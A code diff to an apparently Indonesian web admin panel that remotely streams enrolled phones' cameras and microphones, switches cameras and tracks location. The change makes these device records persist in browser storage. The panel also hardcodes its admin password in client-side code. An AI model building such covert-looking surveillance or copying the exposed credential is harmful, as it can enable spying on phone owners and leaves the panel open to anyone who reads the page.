@@ -165,7 +165,7 @@
   <div class="container">
     <div class="topbar">
       <div>
-        <h1>Panel Pantau Multi-HP (<span id="onlineCount">0</span> Aktif)</h1>
+        <h1>Panel Pantau Multi-HP (<span id="onlineCount">0</span> Terdaftar)</h1>
         <div class="sub" id="lobbyStatus">Terkunci • Menunggu verifikasi password...</div>
       </div>
       <div class="controls">
@@ -194,6 +194,7 @@
     const ADMIN_LOBBY_ID = "jirun-admin-lobby-9988";
     const ADMIN_PASSWORD = "JirunSnd27-";
     const AUTH_STORAGE_KEY = "jirun_admin_unlocked_v1";
+    const SAVED_DEVICES_STORAGE_KEY = "jirun_admin_saved_devices_v1";
     const BACKGROUND_GRACE_MS = 120000;
 
     const PEER_CONFIG = {
@@ -237,6 +238,60 @@
     let modalTargetId = null;
     let modalMode = "error";
 
+    function serializeDeviceForStorage(d) {
+      return {
+        peerId: d.peerId,
+        hpBrand: d.hpBrand || "",
+        hpName: d.hpName || "",
+        facing: d.facing || "Depan",
+        cameraOn: Boolean(d.cameraOn),
+        micOn: Boolean(d.micOn),
+        audioMuted: Boolean(d.audioMuted),
+        inBackground: Boolean(d.inBackground),
+        location: d.location || null,
+        areaName: d.areaName || "",
+        device: d.device || "",
+        updatedAt: d.updatedAt || Date.now(),
+        closedExplicitly: Boolean(d.closedExplicitly)
+      };
+    }
+
+    function saveDevicesToStorage() {
+      try {
+        const list = Object.values(devices).map(serializeDeviceForStorage);
+        localStorage.setItem(SAVED_DEVICES_STORAGE_KEY, JSON.stringify(list));
+      } catch (_) {}
+    }
+
+    function loadSavedDevicesFromStorage() {
+      try {
+        const raw = localStorage.getItem(SAVED_DEVICES_STORAGE_KEY);
+        if (!raw) return;
+        const parsed = JSON.parse(raw);
+        if (!Array.isArray(parsed)) return;
+
+        for (const item of parsed) {
+          if (!item || !item.peerId) continue;
+          const entry = ensureDeviceEntry(item.peerId, false);
+          entry.hpBrand = item.hpBrand || entry.hpBrand;
+          entry.hpName = item.hpName || entry.hpName;
+          entry.facing = item.facing || "Depan";
+          entry.cameraOn = Boolean(item.cameraOn);
+          entry.micOn = Boolean(item.micOn);
+          entry.audioMuted = item.audioMuted !== undefined ? Boolean(item.audioMuted) : true;
+          entry.inBackground = Boolean(item.inBackground);
+          entry.location = item.location || null;
+          entry.areaName = item.areaName || "";
+          entry.device = item.device || "";
+          entry.updatedAt = Number(item.updatedAt) || Date.now();
+          entry.closedExplicitly = Boolean(item.closedExplicitly);
+          entry.connected = false;
+          entry.iceState = "tersimpan";
+          syncDeviceCard(item.peerId);
+        }
+      } catch (_) {}
+    }
+
     function domKey(id) {
       return String(id || "").replace(/[^a-zA-Z0-9_-]/g, "_");
     }
@@ -264,6 +319,7 @@
         sessionStorage.setItem(AUTH_STORAGE_KEY, "1");
         lockScreen.classList.add("hidden");
         err.textContent = "";
+        loadSavedDevicesFromStorage();
         initAdminPeer();
       } else {
         sessionStorage.removeItem(AUTH_STORAGE_KEY);
@@ -413,6 +469,7 @@
       if (areaCache[key]) {
         if (devices[deviceId]) {
           devices[deviceId].areaName = areaCache[key];
+          saveDevicesToStorage();
           syncDeviceCard(deviceId);
         }
         return;
@@ -431,11 +488,13 @@
         areaCache[key] = label;
         if (devices[deviceId]) {
           devices[deviceId].areaName = label;
+          saveDevicesToStorage();
           syncDeviceCard(deviceId);
         }
       } catch (_) {
         if (devices[deviceId] && !devices[deviceId].areaName) {
           devices[deviceId].areaName = "Koordinat aktif (nama daerah belum termuat)";
+          saveDevicesToStorage();
           syncDeviceCard(deviceId);
         }
       } finally {
@@ -465,7 +524,7 @@
 
     function bindMemberDataChannel(conn) {
       const id = conn.peer;
-      const entry = ensureDeviceEntry(id);
+      const entry = ensureDeviceEntry(id, true);
       entry.conn = conn;
 
       const triggerRequest = () => {
@@ -476,6 +535,7 @@
           conn.send({ type: "REQUEST_STREAM", enableMic: true });
           conn.send({ type: "PING" });
         }
+        saveDevicesToStorage();
         syncDeviceCard(id);
       };
 
@@ -489,6 +549,7 @@
           entry.connected = false;
           entry.stream = null;
           attachStreamToCard(id, null);
+          saveDevicesToStorage();
           syncDeviceCard(id);
           return;
         }
@@ -512,6 +573,7 @@
           if ((!entry.stream || !entry.stream.active) && conn.open) {
             conn.send({ type: "REQUEST_STREAM", enableMic: true });
           }
+          saveDevicesToStorage();
           syncDeviceCard(id);
         }
       });
@@ -520,6 +582,7 @@
         if (devices[id] && devices[id].conn === conn) {
           devices[id].conn = null;
           devices[id].connected = false;
+          saveDevicesToStorage();
           syncDeviceCard(id);
         }
       });
@@ -533,7 +596,7 @@
       peer = new Peer(ADMIN_LOBBY_ID, PEER_CONFIG);
 
       peer.on("open", (id) => {
-        document.getElementById("lobbyStatus").textContent = `Lobby Aktif (${id}) • Siap menerima koneksi HP`;
+        document.getElementById("lobbyStatus").textContent = `Lobby Aktif (${id}) • Data HP tersimpan permanen`;
         connectAllDevices();
       });
 
@@ -543,7 +606,7 @@
 
       peer.on("call", (call) => {
         const id = call.peer;
-        const entry = ensureDeviceEntry(id);
+        const entry = ensureDeviceEntry(id, true);
         entry.call = call;
         attachIceMonitor(id, call);
         call.answer();
@@ -554,6 +617,7 @@
           entry.connected = true;
           entry.updatedAt = Date.now();
           attachStreamToCard(id, remoteStream);
+          saveDevicesToStorage();
           syncDeviceCard(id);
         });
         call.on("close", () => {
@@ -579,7 +643,7 @@
       });
     }
 
-    function ensureDeviceEntry(id) {
+    function ensureDeviceEntry(id, persist = true) {
       if (!devices[id]) {
         const prefix = (id.split("-")[0] || "").toLowerCase();
         devices[id] = {
@@ -602,6 +666,7 @@
           call: null,
           stream: null
         };
+        if (persist) saveDevicesToStorage();
       }
       return devices[id];
     }
@@ -628,6 +693,7 @@
         entry.conn.send({ type: "ENABLE_MIC" });
       }
       applyCardAudioMute(id, false);
+      saveDevicesToStorage();
       syncDeviceCard(id);
     }
 
@@ -645,6 +711,7 @@
         entry.conn.send({ type: "ENABLE_MIC" });
       }
       applyCardAudioMute(id, nextMuted);
+      saveDevicesToStorage();
       syncDeviceCard(id);
     }
 
@@ -666,6 +733,7 @@
         applyCardAudioMute(id, muted);
         syncDeviceCard(id);
       }
+      saveDevicesToStorage();
     }
 
     function connectAllDevices() {
@@ -682,6 +750,7 @@
       if (entry && entry.conn && entry.conn.open) {
         entry.facing = facing === "environment" ? "Belakang" : "Depan";
         entry.conn.send({ type: "SWITCH_CAM", facing, enableMic: true });
+        saveDevicesToStorage();
         syncDeviceCard(id);
       }
     }
@@ -831,11 +900,11 @@
           attachStreamToCard(id, null);
         }
         if (statusChip) {
-          statusChip.textContent = d.closedExplicitly ? "DI-CLOSE" : `MATI (${ageSec}d)`;
+          statusChip.textContent = d.closedExplicitly ? "DI-CLOSE" : `TERSIMPAN (${ageSec}d)`;
           statusChip.className = "chip off";
         }
         if (ph) {
-          ph.textContent = "Perangkat sudah ditutup (di-close)";
+          ph.textContent = "Perangkat tersimpan permanen • Menunggu koneksi aktif...";
         }
       } else if (hasLiveStream && !d.inBackground) {
         if (statusChip) {
@@ -909,10 +978,7 @@
         }
       }
 
-      const activeCount = Object.values(devices).filter(
-        (item) => !item.closedExplicitly && (Date.now() - (item.updatedAt || 0)) <= BACKGROUND_GRACE_MS
-      ).length;
-      document.getElementById("onlineCount").textContent = activeCount;
+      document.getElementById("onlineCount").textContent = Object.keys(devices).length;
     }
 
     function syncAllCards() {
